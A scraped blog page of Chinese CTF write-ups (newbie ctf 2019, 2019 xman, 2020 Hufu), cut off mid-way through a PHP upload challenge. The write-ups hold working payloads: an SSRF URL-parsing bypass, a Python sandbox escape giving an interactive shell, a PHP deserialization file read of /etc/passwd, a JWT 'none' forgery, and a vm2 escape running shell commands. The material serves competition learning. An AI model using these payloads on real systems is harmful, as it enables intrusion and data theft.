<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http://blog.ccreater.top/page/4/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/nbctf/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:49:27.394Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/nbctf/">newbie ctf 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
<blockquote>
<p>You can get flag in “normalflag.iwinv.net”</p>
</blockquote>
<p>题目给的链接</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
<p>直接访问 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
<p>输入网站测试发现,会在网址后面加个secret参数</p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p>
<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
<p>观察secret发现，每次访问给出的secret都不一样</p>
<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
<p>这就很容易想到php里面libcurl和parase的差异</p>
<blockquote>
<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a href="http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
<p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p>
</blockquote>
<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
<p>KorNewbie{w0w_e4g1e_3y3}</p>
<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
<p>观察发现一个字符会被编码成2位的16进制的数据</p>
<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
<pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)
s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)
print(s1)
print(s2)
for i in range(len(s1)):
    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre>
<p>KorNewbie{Nace_I_believed_it}</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
<blockquote>
<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
<p>flag format : KorNewbie{password_yougetinformation}</p>
<p>※ If there is a hash value, it will be md5.</p>
</blockquote>
<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
<p>过滤找到ftp传输文件和账号密码</p>
<p>password:root</p>
<p>badguy.txt</p>
<pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decode得到</p>
<pre><code>이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. 
//alpha组的个人信息全部放在下面的地址里。祝你成功..
https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
<p>题目提示得到的一个信息是md5</p>
<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
<p>这里也提示了凯撒加密</p>
<p>但是用国内的md5解密网站无论如何也破不了</p>
<p>用朝鲜语搜了一下就解密了</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
<p>KorNewbie{root_IronDragon}</p>
<p>………………………</p>
<p>这是个梗吗.</p>
<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
<blockquote>
<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
</blockquote>
<p>user:NewbieCTF2019</p>
<p>在youtube找到一个好玩的重置密码的方法</p>
<p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
<p>根据这个来重置密码</p>
<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
<p>最后拿到flag</p>
<p><code>KorNewbie{renek@it-simple.net}</code></p>
<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
<p>于是就开始用binwalk,strings…..</p>
<p>最后翻一翻找到了seg段…………</p>
<p>在seg段找到</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/nbctf/">http://blog.ccreater.top/2020/04/20/nbctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/nbctf/" data-id="cka3ckr33002yv4v0ebst1y7k" data-title="newbie ctf 2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:44:22.257Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
<p>getattr:对沙箱逃逸有很大作用</p>
<p>list(s)获得字符集,可以用来绕过引号限制</p>
<p>试了一下system</p>
<pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre>
<p>发现引号和点都被过滤了,不过提示说</p>
<pre><code class="python">def hello():
   os.system(&quot;echo hello&quot;)</code></pre>
<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
<p>而引号被过滤可以用字符串s里的值来绕过</p>
<pre><code class="python">#考虑这样来
a=getattr(os,&#39;system&#39;)
a(&quot;命令&quot;)</code></pre>
<pre><code class="python">def get_str(string):
    result=&#39;&#39;
    for i in string:
        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;
    return result[:-1]
conn=remote(&#39;47.97.253.115&#39;,10005)
conn.sendline(&#39;table=list(s)&#39;)
conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))
conn.sendline(&#39;fun=getattr(os,sys)&#39;)
while 1:
        command=input(&#39;(www):$&#39;)
        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;
        conn.sendline(new_com)
        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))
conn.close()
</code></pre>
<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
<p>所有的数据都是32个字符</p>
<p>所以猜测是md5加密</p>
<p>找出符合md5格式的数据</p>
<p>68dffd5a1be838b5326209714f7ea7a5</p>
<p>解密后提交flag{n3k0}失败</p>
<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
<p>成功</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
<pre><code class="php">&lt;?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this-&gt;a, &#39;flag&#39;);
        if($b) {
            die(&quot;Bye!&quot;);
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this-&gt;a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }

    function __destruct(){
        $this-&gt;test();
    }
}

if (isset($_GET[&quot;z&quot;])) {
    unserialize($_GET[&quot;z&quot;]);
} else {
    highlight_file(__FILE__);
}</code></pre>
<p>curl_exec+反序列化</p>
<p>试了下本地文件读取</p>
<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
<p>题目过滤flag字符</p>
<p>说明我们flag就在flag文件里</p>
<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
<p>最后的payload:</p>
<p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
<p>这里有一些坑就是:</p>
<ol>
<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
</li>
<li><p>因为是二次编码所以要注意字符串的长度</p>
</li>
</ol>
<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
<p>发现onion.jpg文件尾后还有数据</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
<p>zip格式,get一个新的加密压缩包</p>
<p>密码在hint里有提示</p>
<p>接下来就是很普通的写python了</p>
<pre><code class="python">import zipfile
def burp(filename,hint):
    password=&#39;&#39;
    i=0
    for i in range(32,128):
        password=hint.replace(&#39;?&#39;,chr(i))
        with zipfile.ZipFile(filename) as myzip:
            try :
                print(&quot;解密:&quot;+filename+&quot;:&quot;+password)
                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))
                break
                return password
            except RuntimeError: 
                print(&quot;解密失败&quot;)
            except FileNotFoundError:
                input(&#39;过来康康&#39;)
            except zipfile.zlib.error:
                print(&quot;跳过&quot;)
    if i==127:
        print(&quot;爆破失败&quot;)
        exit()
    print(&#39;爆破成功&#39;+password)
    return password

def writebyte(bbyte,filename):
    f=open(filename,&#39;wb&#39;)
    f.write(bbyte)
    f.close()
def readbyte(filename):
    f=open(filename,&#39;rb&#39;)
    bbyte=f.read()
    f.close()
    return bbyte

nullbyte=b&#39;&#39;
while 1:
    f=open(&#39;temp.txt&#39;,&#39;r&#39;)
    hint=f.read()[12:]
    f.close()
    pwd=burp(&#39;onion1.zip&#39;,hint)

    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:
        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.zip&quot;)
        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.txt&quot;)
    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)

</code></pre>
<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
<pre><code class="python">def encrypt(data,groupnums):
    a=[]
    b=[]
    section=int(len(data)/groupnums)
    for i in range(0,len(data),section):
        a.append(data[i:i+section])
    for i in range(section):
        for j in range(groupnums):
            b.append(a[j][i])
    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))
    return cipher
def decrypt(data):
    result=[]
    for i in range(1,len(data)+1):
        result.append(encrypt(data,i))
    return result

may_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)
for i in may_r:
    print(i[::2]+i[1::2])</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/">http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cka3ckr1o0002v4v00vwvd36g" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020数字中国创新大赛-虎符网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T02:39:54.120Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p>
<pre><code class="javascript">/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */</code></pre>
<p>于是直接访问app.js</p>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);</code></pre>
<p>然后rest.js</p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};</code></pre>
<p>controller.js</p>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};</code></pre>
<p>fuzz controllers目录得到</p>
<p>api.js</p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};</code></pre>
<p>view.js</p>
<pre><code class="javascript">module.exports = {
    &#39;GET /&#39;: async (ctx, next) =&gt; {
        ctx.status = 302;    
        ctx.redirect(&#39;/home&#39;);
    },
    &#39;GET /login&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;login&#39;);
            await next();
        }
    },
    &#39;GET /register&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;register&#39;);
            await next();
        }
    },
    &#39;GET /home&#39;: async (ctx, next) =&gt; {
        if(!ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/login&#39;);
        } else {
            await ctx.render(&#39;home&#39;, {
                username: ctx.session.username,
            });
            await next();
        }
    }
};</code></pre>
<p>阅读代码发现：</p>
<pre><code class="javascript">
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }
const secret = global.secrets[sid];
//验证之前</code></pre>
<p>我们可以控制sid来选择任意的密钥</p>
<p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p>
<p>我们令<code>sid=false</code>,则可以通过</p>
<pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p>
<p>最后的payload</p>
<pre><code class="python">import jwt
import json
a=json.loads(&#39;&#39;&#39;{
        &quot;secretid&quot;: false,
        &quot;username&quot;:&quot;admin&quot;,
        &quot;password&quot;: &quot;admin&quot;,
        &quot;iat&quot;: 1587310401
}&#39;&#39;&#39;)
print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算
code: (2+6-7)/3

run online: /run.php?code=(2%2b6-7)/3;

Ouput: 0.3333333333333333

注意编码 =.=

时间戳
code: new Date();

run online: /run.php?code=new%20Date();

Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)

真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p>
<p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p>
<p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
<p>payload:</p>
<pre><code class="javascript">const axios = require(&#39;axios&#39;)
const untrusted = &#39;(&#39; + function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();
    }
}+&#39;)()&#39;;
const content = Buffer.from(untrusted).toString(&#39;hex&#39;)
axios.get(
&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;
).then(p =&gt; {
    console.log(p.data)
}).catch(p =&gt; {
    console.log((p.response.data))
})
</code></pre>
<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
